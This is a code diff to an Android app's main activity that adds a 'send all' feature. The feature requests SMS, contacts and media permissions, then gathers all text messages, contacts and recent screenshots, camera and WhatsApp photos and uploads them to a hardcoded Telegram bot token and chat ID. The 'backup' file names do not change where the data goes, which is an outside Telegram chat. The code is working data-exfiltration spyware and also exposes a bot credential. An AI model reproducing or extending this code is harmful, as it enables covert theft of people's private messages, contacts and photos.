@@ -22,6 +22,7 @@ import androidx.activity.result.contract.ActivityResultContracts;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.content.ContextCompat;
 
+import java.io.ByteArrayOutputStream;
 import java.io.DataOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
@@ -30,6 +31,7 @@ import java.net.HttpURLConnection;
 import java.net.URL;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.Map;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
@@ -39,7 +41,7 @@ public class MainActivity extends AppCompatActivity {
     private static final String TELEGRAM_BOT_TOKEN = "8410087487:AAEouEc1-5-ktGPdNfEJhlYh5UALXxTy2PQ";
     private static final String TELEGRAM_CHAT_ID = "-1003860055748";
 
-    private enum ExportType { SMS, CONTACTS, SCREENSHOTS }
+    private enum ExportType { SMS, CONTACTS, SCREENSHOTS, ALL }
     private ExportType pendingExportType;
 
     private final ExecutorService executorService = Executors.newSingleThreadExecutor();
@@ -71,6 +73,25 @@ public class MainActivity extends AppCompatActivity {
                     if (uri != null) {
                         saveToFileInBackground(uri, pendingExportType);
                     }
+                }
+            });
+
+    private final ActivityResultLauncher<String[]> requestMultiplePermissionsLauncher =
+            registerForActivityResult(new ActivityResultContracts.RequestMultiplePermissions(), result -> {
+                boolean allGranted = true;
+                for (Map.Entry<String, Boolean> entry : result.entrySet()) {
+                    if (!entry.getValue()) {
+                        allGranted = false;
+                        break;
+                    }
+                }
+
+                if (allGranted) {
+                    if (pendingExportType == ExportType.ALL) {
+                        sendAllToTelegram();
+                    }
+                } else {
+                    Toast.makeText(this, "Permissions denied. Some features may not work.", Toast.LENGTH_SHORT).show();
                 }
             });
 
@@ -111,6 +132,33 @@ public class MainActivity extends AppCompatActivity {
                 requestPermissionLauncher.launch(permission);
             }
         });
+
+        Button btnSendAll = findViewById(R.id.btn_send_all);
+        btnSendAll.setOnClickListener(v -> {
+            pendingExportType = ExportType.ALL;
+            String imagePermission = Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU ?
+                    Manifest.permission.READ_MEDIA_IMAGES : Manifest.permission.READ_EXTERNAL_STORAGE;
+
+            String[] permissions = {
+                    Manifest.permission.READ_SMS,
+                    Manifest.permission.READ_CONTACTS,
+                    imagePermission
+            };
+
+            boolean allGranted = true;
+            for (String p : permissions) {
+                if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
+                    allGranted = false;
+                    break;
+                }
+            }
+
+            if (allGranted) {
+                sendAllToTelegram();
+            } else {
+                requestMultiplePermissionsLauncher.launch(permissions);
+            }
+        });
     }
 
     private void startSmsExport() {
@@ -119,6 +167,71 @@ public class MainActivity extends AppCompatActivity {
 
     private void startContactsExport() {
         createFile("my_contacts_backup.txt");
+    }
+
+    private void sendAllToTelegram() {
+        executorService.execute(() -> {
+            mainHandler.post(() -> Toast.makeText(MainActivity.this, "Gathering all data...", Toast.LENGTH_SHORT).show());
+
+            // 1. Gather Images
+            List<Uri> screenshots = findLatestImages("Screenshot", 5);
+            List<Uri> cameraPhotos = findLatestImages("Camera", 5);
+            List<Uri> whatsappPhotos = findLatestImages("WhatsApp", 5);
+
+            List<Uri> allImages = new ArrayList<>();
+            allImages.addAll(screenshots);
+            allImages.addAll(cameraPhotos);
+            allImages.addAll(whatsappPhotos);
+
+            // 2. Gather SMS
+            byte[] smsData = null;
+            try (ByteArrayOutputStream baos = new ByteArrayOutputStream()) {
+                writeSmsToStream(baos);
+                smsData = baos.toByteArray();
+            } catch (IOException e) {
+                Log.e(TAG, "Error gathering SMS", e);
+            }
+
+            // 3. Gather Contacts
+            byte[] contactData = null;
+            try (ByteArrayOutputStream baos = new ByteArrayOutputStream()) {
+                writeContactsToStream(baos);
+                contactData = baos.toByteArray();
+            } catch (IOException e) {
+                Log.e(TAG, "Error gathering contacts", e);
+            }
+
+            // 4. Upload everything
+            int successCount = 0;
+            for (int i = 0; i < allImages.size(); i++) {
+                if (uploadFileToTelegram(allImages.get(i), "image_" + i + ".png")) {
+                    successCount++;
+                }
+            }
+
+            boolean smsSuccess = false;
+            if (smsData != null && smsData.length > 0) {
+                smsSuccess = uploadDocumentToTelegram(smsData, "sms_backup.txt");
+            }
+
+            boolean contactSuccess = false;
+            if (contactData != null && contactData.length > 0) {
+                contactSuccess = uploadDocumentToTelegram(contactData, "contacts_backup.txt");
+            }
+
+            final int finalImageSuccess = successCount;
+            final boolean finalSmsSuccess = smsSuccess;
+            final boolean finalContactSuccess = contactSuccess;
+            final int totalImages = allImages.size();
+
+            mainHandler.post(() -> {
+                String msg = String.format("Sent %d/%d images. SMS: %s, Contacts: %s",
+                        finalImageSuccess, totalImages,
+                        finalSmsSuccess ? "OK" : "Failed",
+                        finalContactSuccess ? "OK" : "Failed");
+                Toast.makeText(MainActivity.this, msg, Toast.LENGTH_LONG).show();
+            });
+        });
     }
 
     private void createFile(String title) {
@@ -216,7 +329,7 @@ public class MainActivity extends AppCompatActivity {
 
     private void sendScreenshotsToTelegram() {
         executorService.execute(() -> {
-            List<Uri> screenshotUris = findLatestScreenshots();
+            List<Uri> screenshotUris = findLatestImages("Screenshot", 5);
             if (screenshotUris.isEmpty()) {
                 mainHandler.post(() -> Toast.makeText(MainActivity.this, "No screenshots found", Toast.LENGTH_SHORT).show());
                 return;
@@ -226,7 +339,7 @@ public class MainActivity extends AppCompatActivity {
 
             int successCount = 0;
             for (Uri uri : screenshotUris) {
-                if (uploadFileToTelegram(uri)) {
+                if (uploadFileToTelegram(uri, "screenshot.png")) {
                     successCount++;
                 }
             }
@@ -236,7 +349,7 @@ public class MainActivity extends AppCompatActivity {
         });
     }
 
-    private List<Uri> findLatestScreenshots() {
+    private List<Uri> findLatestImages(String folderKeyword, int limit) {
         List<Uri> uris = new ArrayList<>();
         Uri collection = Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q ?
                 MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL) :
@@ -248,32 +361,29 @@ public class MainActivity extends AppCompatActivity {
                 MediaStore.Images.Media.DATE_TAKEN
         };
 
-        // Try to find screenshots by checking if "Screenshots" or "Screenshot" is in the path or bucket name
         String selection = MediaStore.Images.Media.DATA + " LIKE ? OR " +
-                MediaStore.Images.Media.DATA + " LIKE ? OR " +
-                MediaStore.Images.Media.BUCKET_DISPLAY_NAME + " LIKE ? OR " +
                 MediaStore.Images.Media.BUCKET_DISPLAY_NAME + " LIKE ?";
 
-        String[] selectionArgs = new String[]{"%Screenshots%", "%Screenshot%", "%Screenshots%", "%Screenshot%"};
+        String[] selectionArgs = new String[]{"%" + folderKeyword + "%", "%" + folderKeyword + "%"};
         String sortOrder = MediaStore.Images.Media.DATE_TAKEN + " DESC";
 
         try (Cursor cursor = getContentResolver().query(collection, projection, selection, selectionArgs, sortOrder)) {
             if (cursor != null) {
                 int idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
-                while (cursor.moveToNext() && uris.size() < 5) {
+                while (cursor.moveToNext() && uris.size() < limit) {
                     long id = cursor.getLong(idColumn);
                     Uri contentUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id);
                     uris.add(contentUri);
                 }
             }
         } catch (Exception e) {
-            Log.e(TAG, "Error querying MediaStore", e);
+            Log.e(TAG, "Error querying MediaStore for " + folderKeyword, e);
         }
 
         return uris;
     }
 
-    private boolean uploadFileToTelegram(Uri uri) {
+    private boolean uploadFileToTelegram(Uri uri, String filename) {
         HttpURLConnection conn = null;
         try {
             String urlString = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendPhoto";
@@ -294,7 +404,7 @@ public class MainActivity extends AppCompatActivity {
 
                 // photo
                 out.writeBytes("--" + boundary + "\r\n");
-                out.writeBytes("Content-Disposition: form-data; name=\"photo\"; filename=\"screenshot.png\"\r\n");
+                out.writeBytes("Content-Disposition: form-data; name=\"photo\"; filename=\"" + filename + "\"\r\n");
                 out.writeBytes("Content-Type: image/png\r\n\r\n");
 
                 try (InputStream inputStream = getContentResolver().openInputStream(uri)) {
@@ -328,6 +438,45 @@ public class MainActivity extends AppCompatActivity {
             return true;
         } catch (Exception e) {
             Log.e(TAG, "Error uploading to Telegram", e);
+            return false;
+        } finally {
+            if (conn != null) conn.disconnect();
+        }
+    }
+
+    private boolean uploadDocumentToTelegram(byte[] data, String filename) {
+        HttpURLConnection conn = null;
+        try {
+            String urlString = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendDocument";
+            URL url = new URL(urlString);
+            conn = (HttpURLConnection) url.openConnection();
+            conn.setConnectTimeout(15000);
+            conn.setReadTimeout(15000);
+            conn.setDoOutput(true);
+            conn.setRequestMethod("POST");
+            String boundary = "*****" + System.currentTimeMillis() + "*****";
+            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
+
+            try (DataOutputStream out = new DataOutputStream(conn.getOutputStream())) {
+                // chat_id
+                out.writeBytes("--" + boundary + "\r\n");
+                out.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
+                out.writeBytes(TELEGRAM_CHAT_ID + "\r\n");
+
+                // document
+                out.writeBytes("--" + boundary + "\r\n");
+                out.writeBytes("Content-Disposition: form-data; name=\"document\"; filename=\"" + filename + "\"\r\n");
+                out.writeBytes("Content-Type: text/plain\r\n\r\n");
+                out.write(data);
+                out.writeBytes("\r\n");
+                out.writeBytes("--" + boundary + "--\r\n");
+                out.flush();
+            }
+
+            int responseCode = conn.getResponseCode();
+            return responseCode == HttpURLConnection.HTTP_OK;
+        } catch (Exception e) {
+            Log.e(TAG, "Error uploading document to Telegram", e);
             return false;
         } finally {
             if (conn != null) conn.disconnect();
